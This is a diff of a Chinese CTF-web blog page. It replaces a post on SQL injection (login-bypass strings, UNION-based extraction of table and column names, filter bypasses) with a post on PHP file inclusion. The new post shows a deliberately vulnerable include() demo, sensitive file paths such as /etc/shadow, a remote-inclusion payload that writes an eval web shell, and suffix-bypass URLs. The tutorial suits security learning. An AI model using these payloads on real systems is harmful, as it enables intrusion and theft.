@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="CTF Web,SQL注入漏洞,数据库,">
+  <meta name="keywords" content="CTF Web,PHP,后端,文件包含漏洞,">
 
 
 
@@ -87,18 +87,20 @@
 
 
 
-<meta name="description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
-<meta name="keywords" content="CTF Web,SQL注入漏洞,数据库">
+<meta name="description" content="0x00 文件包含与文件包含漏洞文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。 文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本">
+<meta name="keywords" content="CTF Web,PHP,后端,文件包含漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入总结">
-<meta property="og:url" content="https://kevens10.github.io/2019/10/20/SQL注入总结/index.html">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://kevens10.github.io/2019/11/09/文件包含漏洞/index.html">
 <meta property="og:site_name" content="Keven S">
-<meta property="og:description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
+<meta property="og:description" content="0x00 文件包含与文件包含漏洞文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。 文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-21T04:53:33.322Z">
+<meta property="og:image" content="https://kevens10.github.io/images/baohanloudong3.png">
+<meta property="og:updated_time" content="2019-11-09T10:33:47.026Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入总结">
-<meta name="twitter:description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
+<meta name="twitter:title" content="文件包含漏洞">
+<meta name="twitter:description" content="0x00 文件包含与文件包含漏洞文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。 文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本">
+<meta name="twitter:image" content="https://kevens10.github.io/images/baohanloudong3.png">
 
 
 
@@ -128,7 +130,7 @@
 
 
 
-  <link rel="canonical" href="https://kevens10.github.io/2019/10/20/SQL注入总结/">
+  <link rel="canonical" href="https://kevens10.github.io/2019/11/09/文件包含漏洞/">
 
 
 
@@ -150,7 +152,7 @@
 
 
 
-  <title>SQL注入总结 | Keven S</title>
+  <title>文件包含漏洞 | Keven S</title>
   
 
 
@@ -343,7 +345,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://kevens10.github.io/2019/10/20/SQL注入总结/">
+    <link itemprop="mainEntityOfPage" href="https://kevens10.github.io/2019/11/09/文件包含漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Keven">
@@ -360,7 +362,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL注入总结</h1>
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞</h1>
         
 
         <div class="post-meta">
@@ -372,8 +374,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-20T22:09:33+08:00">
-                2019-10-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-09T22:32:44+08:00">
+                2019-11-09
               </time>
             
 
@@ -388,8 +390,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-10-21T12:53:33+08:00">
-                2019-10-21
+              <time title="更新于" itemprop="dateModified" datetime="2019-11-09T18:33:47+08:00">
+                2019-11-09
               </time>
             
           </span>
@@ -444,7 +446,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2,092 字
+                  1,646 字
                 </span>
               
 
@@ -460,7 +462,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  9 分钟
+                  7 分钟
                 </span>
               
             </div>
@@ -481,71 +483,64 @@
       
 
       
-        <h2 id="0x00-SQL注入原理与分类"><a href="#0x00-SQL注入原理与分类" class="headerlink" title="0x00 SQL注入原理与分类"></a>0x00 SQL注入原理与分类</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。</p>
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>按照参数类型可分为两种：数字型和字符型。<br>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p>
-<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>根据数据库返回的结果，分为回显注入、报错注入、盲注。</p>
-<p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p>
-<p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
-<p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p>
-<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入</p>
-<h2 id="0X01-注入常见参数"><a href="#0X01-注入常见参数" class="headerlink" title="0X01 注入常见参数"></a>0X01 注入常见参数</h2><pre><code>user()：当前数据库用户
-database()：当前数据库名
-version()：当前使用的数据库版本
-@@datadir：数据库存储数据路径
-concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)
-group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来
-concat_ws()：用法类似
-hex() 和 unhex()：用于 hex 编码解码
-load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\
-select xxoo into outfile &apos;路径&apos;：权限较高时可直接写文件</code></pre><h2 id="0x02-后台万能密码"><a href="#0x02-后台万能密码" class="headerlink" title="0x02 后台万能密码"></a>0x02 后台万能密码</h2><pre><code>admin&apos; --
-admin&apos; #
-admin&apos;/*
-&apos; or 1=1--
-&apos; or 1=1#
-&apos; or 1=1/*
-&apos;) or &apos;1&apos;=&apos;1--
-&apos;) or (&apos;1&apos;=&apos;1--
-以不同的用户登陆 &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--</code></pre><h2 id="0x03-Mysql相关知识"><a href="#0x03-Mysql相关知识" class="headerlink" title="0x03 Mysql相关知识"></a>0x03 Mysql相关知识</h2><p>MySQL数据库的特有的表是 information_schema.tables  , access数据库特有的表是 msysobjects 、SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) #</span><br><span class="line">	 </span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from msysobjects) #</span><br><span class="line"></span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from sysobjects) #</span><br></pre></td></tr></table></figure>
+        <h2 id="0x00-文件包含与文件包含漏洞"><a href="#0x00-文件包含与文件包含漏洞" class="headerlink" title="0x00 文件包含与文件包含漏洞"></a>0x00 文件包含与文件包含漏洞</h2><p>文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。</p>
+<p>文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含LFI和远程文件包含RFI两种形式</p>
+<h2 id="0x01-文件包含函数"><a href="#0x01-文件包含函数" class="headerlink" title="0x01 文件包含函数"></a>0x01 文件包含函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vrequire()</span><br><span class="line"></span><br><span class="line">require_once()</span><br><span class="line"></span><br><span class="line">include()</span><br><span class="line"></span><br><span class="line">include_once()</span><br></pre></td></tr></table></figure>
 
-<p>对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
-<h5 id="mysql中注释符：-、-、-–"><a href="#mysql中注释符：-、-、-–" class="headerlink" title="mysql中注释符：#   、/**/  、  –"></a>mysql中注释符：#   、/**/  、  –</h5><h5 id="information-schema数据库中三个很重要的表："><a href="#information-schema数据库中三个很重要的表：" class="headerlink" title="information_schema数据库中三个很重要的表："></a>information_schema数据库中三个很重要的表：</h5><p>•    information_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名</p>
-<p>•    information_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名</p>
-<p>•    information_schema.columns:    该数据表存储了mysql数据库中的所有列的列名</p>
-<h5 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h5><p>ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97</p>
-<p>length(str) : 返回给定字符串的长度，如  length(“string”)=6</p>
-<p>substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr(“chinese”,3,2)=”in”</p>
-<p>substr()、stbstring()、mid()  三个函数的用法、功能均一致</p>
-<p>concat(username)：将查询到的username连在一起，默认用逗号分隔</p>
-<p>concat(str1,’<em>‘,str2)：将字符串str1和str2的数据查询到一起，中间用</em>连接<br>group_concat(username) ：将username数据查询在一起，用逗号连接</p>
-<p>limit 0,1：查询第1个数<br>limit  1,1： 查询第2个数<br>limit  n,1： 查询第n+1个数</p>
-<p>CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制</p>
-<h2 id="0x04-判断是否存在SQL注入"><a href="#0x04-判断是否存在SQL注入" class="headerlink" title="0x04 判断是否存在SQL注入"></a>0x04 判断是否存在SQL注入</h2><p>1.可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。</p>
-<p>2.先加单引号、双引号、单括号、双括号等看看是否报错，如果报错就肯定存在SQL注入漏洞了。<br>还有在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p>
-<h2 id="0x05-获取数据库名"><a href="#0x05-获取数据库名" class="headerlink" title="0x05 获取数据库名"></a>0x05 获取数据库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT database();</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br><span class="line">id=1&apos; union select 1,database() #;</span><br><span class="line">admin_name=1&quot; union select database(),2%23;</span><br><span class="line">id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23;</span><br></pre></td></tr></table></figure>
+<p>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；require函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<h2 id="0x02-漏洞产生原因"><a href="#0x02-漏洞产生原因" class="headerlink" title="0x02 漏洞产生原因"></a>0x02 漏洞产生原因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，用户可以操作一些敏感文件，文件泄露和恶意代码注入，可以被用户控制，包含其他恶意文件，执行非预期的代码<br>当包含文件在服务器本地上，就形成本地文件包含，当包含的文件在第三方服务器是，就形成可远程文件包含。<br>demo:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&apos;filename&apos;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改filename的值，执行非预期的操作。</span><br><span class="line"></span><br><span class="line">## 0x03 本地文件包含</span><br><span class="line">本地文件包含LFI也即Local File Inclusion，其特性是可包含任意类型的文件，当被包含的文件书写符合php书写规范，即（&lt;？php..…….代码.……？&gt;或&lt;？.…代码..？&gt;）时，不论文件后缀是什么，都可以解析其中的php代码，当书写规范不符合时，则以文本形式输出。</span><br><span class="line">测试：</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&apos;filename&apos;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">![](/images/baohanloudong1.png)</span><br><span class="line">![](/images/baohanloudong2.png)</span><br><span class="line"></span><br><span class="line">## 0x04 远程文件包含</span><br><span class="line">远程文件包含RFI也即Remote File Inclusion，其基本原理与本地文件包含LFI类似，区别只是被包含的文件由原来的本地文件路径变为远程文件路径。其特性是可包含任意类型的文件，并且如果被包含文件中有类似&quot;&lt;？php…（省略号为php代码）？&gt;”或</span><br><span class="line">“&lt;？.…（省略号为php代码）？&gt;”这2种形式的字符串，则在包含时会执行字符串中的PHP代码。</span><br><span class="line">``` </span><br><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line">allow_url_include = On（是否允许include/require远程文件）</span><br><span class="line">``` </span><br><span class="line">前提：需要开启allow_url_fopen，默认关闭。</span><br><span class="line">示例：include.php</span><br><span class="line">``` </span><br><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&apos;filename&apos;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br><span class="line">``` </span><br><span class="line">新建file.txt</span><br><span class="line">``` </span><br><span class="line">&lt;?php</span><br><span class="line">   echo &quot;hello,hacker&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x06-获取表名"><a href="#0x06-获取表名" class="headerlink" title="0x06 获取表名"></a>0x06 获取表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select table_name from information_schema.tables where table_schema=database(); </span><br><span class="line">admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23;</span><br><span class="line">union select 1,table_name from information_schema.tables where table_schema=&apos; &apos;;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() #;</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://www.xxxx.com/file=http://www.xxxx.com/file.txt" target="_blank" rel="noopener">http://www.xxxx.com/file=http://www.xxxx.com/file.txt</a><br>执行结果将输出hello world。</p>
+<h2 id="0x05-文件包含利用"><a href="#0x05-文件包含利用" class="headerlink" title="0x05 文件包含利用"></a>0x05 文件包含利用</h2><h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>通过目录遍历可以获取到系统中其他文件的内容：<br><img src="/images/baohanloudong3.png" alt></p>
+<h4 id="常见敏感信息路径"><a href="#常见敏感信息路径" class="headerlink" title="常见敏感信息路径"></a>常见敏感信息路径</h4><h5 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x07-获取列名"><a href="#0x07-获取列名" class="headerlink" title="0x07 获取列名"></a>0x07 获取列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name = &apos;tablename&apos;;</span><br><span class="line">admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&apos;flag1&apos; %23;</span><br><span class="line">union select 1,column_name from information_schema.columns where table_schema=&apos; &apos; and table_name=&apos; &apos;;</span><br><span class="line">id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# //这里需要用16进制绕过</span><br></pre></td></tr></table></figure>
+<h5 id="Linux-Unix系统"><a href="#Linux-Unix系统" class="headerlink" title="Linux/Unix系统"></a>Linux/Unix系统</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x08-查询结果"><a href="#0x08-查询结果" class="headerlink" title="0x08 查询结果"></a>0x08 查询结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(flag1) from flag1 %23；</span><br><span class="line">admin_name=1&quot; union select (select flag1 from flag1),2%23；</span><br><span class="line">d=-1&apos; union select 1,2,3,skctf_flag from fl4g#；</span><br></pre></td></tr></table></figure>
+<h3 id="session文件包含漏洞-待续"><a href="#session文件包含漏洞-待续" class="headerlink" title="session文件包含漏洞(待续)"></a>session文件包含漏洞(待续)</h3><p>利用条件：</p>
+<p>session的存储位置可以获取。</p>
+<ol>
+<li>通过phpinfo的信息可以获取到session的存储位置。</li>
+</ol>
+<p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p>
+<p>获取到session的存储位置</p>
+<ol start="2">
+<li>通过猜测默认的session存放位置进行尝试。</li>
+</ol>
+<p>如linux下默认存储在/var/lib/php/session目录下：</p>
+<p>默认存储</p>
+<p>session中的内容可以被控制，传入恶意代码。</p>
+<h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><p>新建file.txt保存在远程服务器上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x09-常用的绕过"><a href="#0x09-常用的绕过" class="headerlink" title="0x09 常用的绕过"></a>0x09 常用的绕过</h2><h5 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex 编码</span><br><span class="line"></span><br><span class="line">select * from users where username = 0x61646D696E</span><br><span class="line"></span><br><span class="line">char() 函数</span><br><span class="line"></span><br><span class="line">select * from users where username = char(97, 100, 109, 105, 110)</span><br></pre></td></tr></table></figure>
+<p>如果目标网站存在远程包含漏洞，则可以通过访问：<a href="http://www.xx1.com/index.php?file=http://www.xx2.com/file.txt" target="_blank" rel="noopener">http://www.xx1.com/index.php?file=http://www.xx2.com/file.txt</a><br>会在服务器根目录下生产一个shell.php内容为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   eval($_POST[key]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<h5 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;</span><br><span class="line">select concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select select_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select group_concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br></pre></td></tr></table></figure>
+<h3 id="利用php协议进行包含"><a href="#利用php协议进行包含" class="headerlink" title="利用php协议进行包含"></a>利用php协议进行包含</h3><p>(参考《PHP伪协议》）<br>data:　　php5.2以后版本<br>php://input　　需要开启allow_url_include<br>例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00</span><br></pre></td></tr></table></figure>
 
-<h5 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h5><p>substr(),mid(),limit这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(0 from 1 for 1);</span><br><span class="line">select mid(database(0 from 1 for 1);</span><br><span class="line"></span><br><span class="line">select * from news limit 0,1；</span><br><span class="line"># 等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset 0；</span><br></pre></td></tr></table></figure>
+<h3 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h3><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马file.jpg，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
 
-<h5 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h5><p>使用二分查找的时候需要使用到比较操作符来进行查找。<br>需要使用到greatest来进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64；</span><br></pre></td></tr></table></figure>
+<p>访问URL：<a href="http://www.xxx.com/index.php?file=./file.jpg" target="_blank" rel="noopener">http://www.xxx.com/index.php?file=./file.jpg</a><br>生成shell.php。</p>
+<h2 id="0x06-绕过方法"><a href="#0x06-绕过方法" class="headerlink" title="0x06 绕过方法"></a>0x06 绕过方法</h2><h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&apos;filename&apos;] . &quot;.html&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符。<br>greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+<p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。<br>绕过方式：在最后加？<br>payload：<br><a href="http://www.xxx.com/index.php?filename=http://xxx2/file.txt" target="_blank" rel="noopener">http://www.xxx.com/index.php?filename=http://xxx2/file.txt</a>?</p>
+<h3 id="井号绕过"><a href="#井号绕过" class="headerlink" title="井号绕过"></a>井号绕过</h3><p><a href="http://www.xxx.com/index.php?filename=http://xxx2/file.txt%23" target="_blank" rel="noopener">http://www.xxx.com/index.php?filename=http://xxx2/file.txt%23</a></p>
